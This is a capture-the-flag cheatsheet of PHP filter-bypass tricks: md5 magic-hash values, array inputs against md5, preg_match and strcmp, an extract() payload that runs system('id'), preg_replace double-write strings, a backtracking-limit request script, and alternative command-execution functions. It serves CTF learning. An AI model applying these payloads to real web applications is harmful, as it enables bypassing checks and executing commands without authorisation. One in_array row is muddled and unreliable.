# PHP Bypass-Technique Cheatsheet

## PHP Loose-Comparison Bypass ($a == md5($a))

In PHP loose comparison, a string starting with `0e` is treated as scientific notation and equals `0`.

**⚠️ Key condition: after `0e` everything must be digits (0-9), no letters!**
- ✅ `0e830400451993494058024219903391` -> all digits; PHP treats it as `0 × 10^830...` = `0`
- ❌ `0e993dffb88165eb32369e16dd25b536` -> contains letters `d`/`f`; PHP does not treat it as scientific notation and compares as strings

| Value | MD5 result | digits after 0e? | Notes |
|----|---------|------------|------|
| QNKCDZO | 0e830400451993494058024219903391 | ✅ | starts with 0e; PHP `==` treats it as 0 |
| 240610708 | 0e462097431906509019562988736854 | ✅ | same as above |
| s878926199a | 0e545993274517709034328855841020 | ✅ | same as above |
| s155964671a | 0e342768416822451524974117254469 | ✅ | same as above |
| s214587387a | 0e848204310308006290363795692068 | ✅ | same as above |
| s1091221200a | 0e940625744785414655937625828514 | ✅ | same as above |
| 0e215962017 | 0e291242476940776845150308577824 | ✅ | same as above |

**⚠️ Do not brute-force md5 collision values yourself** — use the values in the table above; they are verified to work.

## PHP Loose-Comparison Bypass ($a != $b && md5($a) == md5($b))

**⚠️ Key condition: after `0e` everything must be digits (0-9), no letters!**

| Value A | Value B | MD5(A) | MD5(B) | digits after 0e? |
|------|------|----------|----------|------------|
| QNKCDZO | 240610708 | 0e830400... | 0e462097... | ✅ both work |
| s878926199a | s155964671a | 0e545993... | 0e342768... | ✅ both work |
| QNKCDZO | s878926199a | 0e830400... | 0e545993... | ✅ both work |

**⚠️ Brute-forced md5 values usually do not work** — `0e993dffb...` contains letters d/f, so PHP does not treat it as scientific notation and the loose comparison fails. Use the verified values in the table above.

## PHP Strict-Comparison Bypass ($a !== $b && md5($a) === md5($b))

`md5()` cannot handle arrays; passing an array returns `NULL`, and `NULL === NULL` is `true`:
```
?a[]=1&b[]=2
md5($_GET['a']) === md5($_GET['b'])  // NULL === NULL → true
```

## Array Bypass

`preg_match()` only handles strings; passing an array returns `false`:
```
?p[]=nss2&p[]=ctf
// preg_match("/n|c/", $_GET['p']) -> false (no match, bypassed)
```

`call_user_func` accepts an array as the callback:
```php
call_user_func(array('ClassName', 'methodName'))  // equivalent to ClassName::methodName()
call_user_func(['nss2', 'ctf'])                   // equivalent to nss2::ctf()
```

## extract() Variable Overwrite

`extract($_GET)` overwrites existing variables with GET parameters:
```
?_GET[cmd]=system('id')
```

## intval() Bypass

```php
if (intval($_GET['num']) === 0) { ... }
// bypass method:
?num=0x10     // hex; intval does not parse it by default
?num=+0       // plus-sign prefix
?num=0e123    // scientific notation
?num[]=1      // array; intval returns 1
```

## PHP Regex Bypass

| Scenario | Method | Example |
|------|------|------|
| Regex without the `i` modifier | case bypass | `Nss2::Ctf` bypasses `/n\|c/m` |
| preg_match only checks strings | array bypass | `p[]=xxx` makes preg_match return false |
| `^$` + `m` modifier | newline bypass | `aaa%0abbb` bypasses `/^aaa$/m` |
| `.` does not match newline | `%0a` bypass | insert a newline |
| Backtracking limit | overlong string | build an overlong string so preg_match returns false (PCRE backtracking limit defaults to 1 million) |

### ⭐ preg_replace Double-Write Bypass (frequent topic)

**Scenario**: `preg_replace('/keyword/', '', $input)` where the result after replacement must **equal the keyword itself**

**Core principle**: embed the full keyword inside the keyword; after the inner one is replaced, the outer halves join to form the original word

**General construction**: `first-half-of-keyword + keyword + second-half-of-keyword`

| Filtered keyword | Double-write input | Replacement process | Result |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | delete the middle NSSCTF -> NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | delete the middle flag -> fl+ag | `flag` ✅ |
| cat | `cacatt` | delete the middle cat -> ca+t | `cat` ✅ |
| system | `syssystemtem` | delete the middle system -> sys+tem | `system` ✅ |
| hack | `hahackck` | delete the middle hack -> ha+ck | `hack` ✅ |

**⚠️ Why case variation does not work:**
- `preg_replace('/NSSCTF/', '', 'NssCTF')` -> `Nss` does not match `NSS` -> returns `NssCTF` unchanged
- `NssCTF !== "NSSCTF"` -> strict comparison fails -> does not pass
- Double-write is the only way to make the replacement result **exactly equal the original string**

**Recognition signal:**
- Source contains `preg_replace('/X/', '', $str)` and `$str === "X"` -> double-write bypass
- Source contains `str_replace('X', '', $str)` and `$str === "X"` -> double-write bypass also applies

### PCRE Backtracking-Limit Bypass

```python
import requests
url = "http://target/index.php"
# Build an overlong string so preg_match exceeds its backtracking limit and returns false
payload = "a" * 1000000 + "evil_content"
data = {"input": payload}
r = requests.post(url, data=data)
print(r.text)
```

## PHP Function/Feature Bypass Quick-Reference

| Scenario | Method | Example |
|------|------|------|
| Regex without `i` | case bypass | `Nss2::Ctf` bypasses `/n\|c/m` |
| preg_match string restriction | array bypass | `p[]=nss2&p[]=ctf` |
| call_user_func on a class method | array callback | `call_user_func(['nss2','ctf'])` |
| Function name contains banned chars | find an alternative | `readfile` has no n/c |
| extract variable overwrite | overwrite key variables | modify auth/permission variables |
| is_numeric check | hex / scientific notation | `0x10`, `1e1` |
| strcmp comparison | array bypass | `pass[]=1` makes strcmp return NULL |
| in_array loose typing | type juggling | `"0admin"` passes `in_array(0, ['admin'])` |

## PHP Code-Execution Alternative Functions

When `system` / `exec` are blocked:

| Function | Usage | Echo |
|------|------|------|
| `system($cmd)` | executes directly | has echo (to stdout) |
| `exec($cmd, $output)` | executes and stores in an array | no direct echo; needs `print_r($output)` |
| `passthru($cmd)` | executes and outputs raw data | has echo |
| `shell_exec($cmd)` | returns a string | no echo; needs `echo` |
| `backtick \`$cmd\`` | equivalent to shell_exec | no echo; needs `echo` |
| `popen($cmd, 'r')` | opens a process pipe | read with `fread` |
| `proc_open()` | more flexible process control | read manually |
